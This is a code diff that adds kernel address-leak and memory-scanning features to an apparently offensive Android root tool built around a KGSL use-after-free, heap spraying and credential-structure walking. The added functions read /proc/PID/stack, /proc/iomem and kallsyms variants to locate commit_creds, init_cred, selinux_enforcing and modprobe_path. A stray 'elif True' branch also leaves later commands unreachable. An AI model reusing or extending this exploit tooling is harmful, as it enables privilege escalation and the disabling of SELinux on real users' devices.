@@ -1821,6 +1821,104 @@ class MemoryExplorerAI:
                 continue
         return False
 
+    def read_proc_stack(self, pid):
+        """v4.1: read /proc/PID/stack to find kernel stack
+        pointer for this thread. The kernel stack is allocated
+        adjacent to the task_struct, so this gives us a known
+        address near the task_struct. From there we can search
+        the slab for the actual task_struct (comm is at +0x718
+        on 5.4 ARM64 GKI).
+
+        Returns the kernel stack address (top of stack) or None.
+        """
+        try:
+            with open(f"/proc/{pid}/stack", "r") as f:
+                lines = f.readlines()
+        except (PermissionError, FileNotFoundError, ProcessLookupError, OSError):
+            return None
+        # /proc/PID/stack looks like:
+        # [<ffffffffc0123456>] some_function+0x42/0x80
+        # ...
+        # The first address is the bottom of the stack.
+        if not lines:
+            return None
+        first = lines[0].strip()
+        if first.startswith("[<") and ">]" in first:
+            try:
+                addr_str = first[2:first.index(">]")]
+                return int(addr_str, 16)
+            except Exception:
+                return None
+        return None
+
+    def parse_iomem(self):
+        """v4.1: read /proc/iomem to find kernel text/data
+        physical addresses. On most Android kernels, this is
+        world-readable and reveals the layout:
+          00000000-00001fff : System RAM
+          ...
+          80000000-8fffffff : Kernel code   (varies)
+          90000000-afffffff : Kernel data   (varies)
+          ...
+
+        On ARM64 with KASLR, /proc/iomem is restricted to
+        CAP_SYS_ADMIN — but on many stock Android kernels
+        it remains world-readable, which lets us find
+        kernel virtual→physical mapping.
+
+        Returns a list of (start, end, name) tuples. Empty
+        if /proc/iomem is restricted.
+        """
+        try:
+            with open("/proc/iomem", "r") as f:
+                lines = f.readlines()
+        except (PermissionError, FileNotFoundError, OSError):
+            return []
+        regions = []
+        for line in lines:
+            # Format: "00000000-00001fff : System RAM"
+            line = line.strip()
+            if ":" not in line:
+                continue
+            try:
+                rng, name = line.split(":", 1)
+                rng = rng.strip()
+                name = name.strip()
+                if "-" in rng:
+                    a, b = rng.split("-", 1)
+                    start = int(a, 16)
+                    end = int(b, 16)
+                    regions.append((start, end, name))
+            except Exception:
+                continue
+        return regions
+
+    def parse_kallsyms_raw(self):
+        """v4.1: read /proc/kallsyms without the kptr_restrict
+        filter. On Android with kptr_restrict=2, addresses are
+        zeroed. But some kernel versions leak the address via
+        /proc/[pid]/kallsyms if the reader has CAP_SYSLOG.
+        We try that path too. Returns the same format as
+        kallsyms dict.
+        """
+        syms = {}
+        # Try main /proc/kallsyms first
+        for path in ("/proc/kallsyms", "/proc/self/kallsyms",
+                     "/proc/thread-self/kallsyms"):
+            try:
+                with open(path, "r") as f:
+                    for line in f:
+                        parts = line.split()
+                        if len(parts) >= 3:
+                            try:
+                                addr = int(parts[0], 16)
+                            except ValueError:
+                                continue
+                            syms[parts[2]] = addr
+            except (PermissionError, FileNotFoundError, OSError):
+                continue
+        return syms
+
     def verify_spray_comms(self):
         """v4.1: cross-check that our spray PIDs actually have
         the KETO/KETW marker in /proc/PID/comm. If they don't,
@@ -4165,16 +4263,41 @@ class MemoryExplorerAI:
         # data section (kbase+0x1000000..+0x4000000) where
         # SELinux/init_cred/init_task live. Otherwise fall back
         # to KGSL UAF area.
+        # v4.1: NEW "wide" mode — if kbase unknown AND we have
+        # spray PIDs alive, scan the entire kernel slab range
+        # (0xffffff8000000000..+0x40000000 = 1GB) for KETO
+        # comms in normal task_structs. This is slow but finds
+        # the spray WITHOUT needing a UAF. The comm is stored
+        # at offset 0x718 in task_struct, so once we find a
+        # KETO* comm we can read the whole task_struct and
+        # walk cred.
         if self.kernel_base:
             scan_lo = self.kernel_base + 0x1000000
             scan_hi = self.kernel_base + 0x4000000
             self.live["last_msg"] = (
                 f"SCANNING kdata 0x{scan_lo:x}..0x{scan_hi:x} (kbase known)")
         else:
-            scan_lo = self.uaf_start
-            scan_hi = self.uaf_start + self.scan_size
-            self.live["last_msg"] = (
-                f"SCANNING uaf 0x{scan_lo:x}..0x{scan_hi:x} (kbase unknown)")
+            # v4.1: check if we have live spray PIDs. If yes,
+            # use WIDE mode (scans kernel slab). If no, fall
+            # back to UAF area (but log that nothing will
+            # be found without UAF trigger).
+            total_alive = sum(
+                len(s) for s in self.spray_procs_by_worker.values())
+            if total_alive > 0:
+                # Wide scan: 0xffffff8000000000..+0x40000000
+                # This is the ARM64 kernel virtual space.
+                # Will find task_structs allocated normally.
+                scan_lo = 0xffffff8000000000
+                scan_hi = 0xffffff8040000000  # 1GB
+                self.live["last_msg"] = (
+                    f"SCANNING WIDE 0x{scan_lo:x}..0x{scan_hi:x} "
+                    f"({total_alive} sprays alive)")
+            else:
+                scan_lo = self.uaf_start
+                scan_hi = self.uaf_start + self.scan_size
+                self.live["last_msg"] = (
+                    f"SCANNING uaf 0x{scan_lo:x}..0x{scan_hi:x} "
+                    f"(kbase unknown, NO sprays alive)")
         self.live["scan_total"] = scan_hi - scan_lo
         self.live["scan_offset"] = 0
 
@@ -6443,6 +6566,121 @@ class MemoryExplorerAI:
                         pass
                 finally:
                     pass  # (no-op, single-thread)
+            elif cmd in ("pidmap", "pstack", "pidscan"):
+                # v4.1: read /proc/PID/stack for each live spray
+                # PID to find the kernel stack pointer. The kernel
+                # stack is allocated right next to the task_struct
+                # in the slab (on 5.4 ARM64: stack at task+offset,
+                # comm at task+0x718). Once we have a stack pointer,
+                # we can scan a small window to find the actual
+                # task_struct and verify the comm.
+                try:
+                    print(C.CLR, end="", flush=True)
+                    print(f"{C.BOLD}{C.CYN}=== PID STACK MAP ==={C.RST}",
+                          flush=True)
+                    print(f"{C.GRY}{'─'*60}{C.RST}", flush=True)
+                    all_pids = set()
+                    for s in self.spray_procs_by_worker.values():
+                        all_pids.update(s)
+                    if not all_pids:
+                        print(f"  {C.RED}no spray procs alive{C.RST}",
+                              flush=True)
+                    found = 0
+                    for pid in list(all_pids)[:10]:
+                        try:
+                            with open(f"/proc/{pid}/comm") as f:
+                                comm = f.read().strip()
+                        except Exception:
+                            continue
+                        stack_ptr = self.read_proc_stack(pid)
+                        if stack_ptr:
+                            found += 1
+                            print(f"  pid={pid:<7} comm={comm:<10} "
+                                  f"stack=0x{stack_ptr:x}", flush=True)
+                        else:
+                            print(f"  pid={pid:<7} comm={comm:<10} "
+                                  f"{C.YEL}stack=N/A (perms?){C.RST}",
+                                  flush=True)
+                    print(f"{C.GRY}{'─'*60}{C.RST}", flush=True)
+                    print(f"  {C.BOLD}{found} stacks readable{C.RST} "
+                          f"(use [rva <hex>] to read pages)", flush=True)
+                    print("Press Enter to return...", flush=True)
+                    try:
+                        self.input_cmd()
+                    except Exception:
+                        pass
+                except Exception as e:
+                    self.live["last_msg"] = f"pidmap error: {e}"
+            elif cmd in ("iomem", "ioreg"):
+                # v4.1: read /proc/iomem. World-readable on most
+                # stock Android. Reveals kernel text/data layout
+                # which is the missing piece for finding kernel
+                # virtual addresses without kallsyms.
+                try:
+                    regions = self.parse_iomem()
+                    print(C.CLR, end="", flush=True)
+                    print(f"{C.BOLD}{C.CYN}=== /proc/iomem ==={C.RST}",
+                          flush=True)
+                    print(f"{C.GRY}{'─'*60}{C.RST}", flush=True)
+                    if not regions:
+                        print(f"  {C.RED}/proc/iomem empty or restricted{C.RST}",
+                              flush=True)
+                    else:
+                        keywords = ("Kernel", "System RAM", "vmalloc",
+                                    "mem", "reserved")
+                        for start, end, name in regions:
+                            if any(kw.lower() in name.lower()
+                                   for kw in keywords):
+                                print(f"  0x{start:08x}-0x{end:08x} : {name}",
+                                      flush=True)
+                    print(f"{C.GRY}{'─'*60}{C.RST}", flush=True)
+                    print("Press Enter to return...", flush=True)
+                    try:
+                        self.input_cmd()
+                    except Exception:
+                        pass
+                except Exception as e:
+                    self.live["last_msg"] = f"iomem error: {e}"
+            elif cmd in ("syms", "kallsyms2", "allsyms"):
+                # v4.1: re-read /proc/kallsyms (and try
+                # thread-self variant) without the kptr_restrict
+                # filter. On some Android kernels the latter
+                # leaks real addresses even when /proc/kallsyms
+                # is zeroed.
+                try:
+                    syms = self.parse_kallsyms_raw()
+                    print(C.CLR, end="", flush=True)
+                    print(f"{C.BOLD}{C.CYN}=== KALLSYMS DEEP ==={C.RST}",
+                          flush=True)
+                    print(f"{C.GRY}{'─'*60}{C.RST}", flush=True)
+                    print(f"  total: {len(syms)}", flush=True)
+                    non_zero = {k: v for k, v in syms.items() if v != 0}
+                    print(f"  non-zero: {len(non_zero)}", flush=True)
+                    for k in ("prepare_kernel_cred", "commit_creds",
+                              "selinux_enforcing", "init_cred",
+                              "init_task", "selinux_state",
+                              "modprobe_path", "kfree"):
+                        v = syms.get(k)
+                        if v:
+                            col = C.GRN if v != 0 else C.YEL
+                            print(f"  {col}{k}{C.RST} = 0x{v:x}", flush=True)
+                            if v != 0:
+                                if k == "prepare_kernel_cred" and not self.kernel_base:
+                                    self.kernel_base = v & ~0x1fffff
+                                elif k == "selinux_enforcing":
+                                    self.selinux_va = v
+                                elif k == "init_cred":
+                                    self.cred_va = v
+                                elif k == "init_task":
+                                    self.init_task_va = v
+                    print(f"{C.GRY}{'─'*60}{C.RST}", flush=True)
+                    print("Press Enter to return...", flush=True)
+                    try:
+                        self.input_cmd()
+                    except Exception:
+                        pass
+                except Exception as e:
+                    self.live["last_msg"] = f"syms error: {e}"
             elif True:
                 pass  # (no-op, single-thread)
             elif cmd in ("clear_kb", "reset_kb"):
@@ -6701,6 +6939,9 @@ class MemoryExplorerAI:
                     ("save / export",     "Save found items → found_items.json"),
                     ("dev / device",      "Show device info (getprop)"),
                     ("verify / vsf",      "Verify spray procs have KETO/KETW comm"),
+                    ("iomem / ioreg",     "Read /proc/iomem for kernel layout"),
+                    ("pidmap / pstack",   "Read /proc/PID/stack for spray PIDs"),
+                    ("syms / allsyms",    "Deep-read /proc/kallsyms (+ thread-self)"),
                     ("health / diag",     "Full health check: engine/kgsl/kallsyms/workers/RAM"),
                     ("reset_kb",          "Reset knowledge base"),
                     ("help / ? / h",      "Show this help"),
